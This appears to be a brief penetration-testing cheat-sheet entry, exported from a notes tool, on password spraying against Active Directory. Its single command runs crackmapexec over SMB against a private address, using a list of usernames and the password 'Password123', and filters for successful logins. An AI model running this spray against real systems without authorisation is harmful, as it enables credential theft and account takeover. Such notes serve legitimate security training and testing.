# crackmap exec password spray

OS: Active_Directory, Linux, Windows
Description: spray passwords using Crackmapexec
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```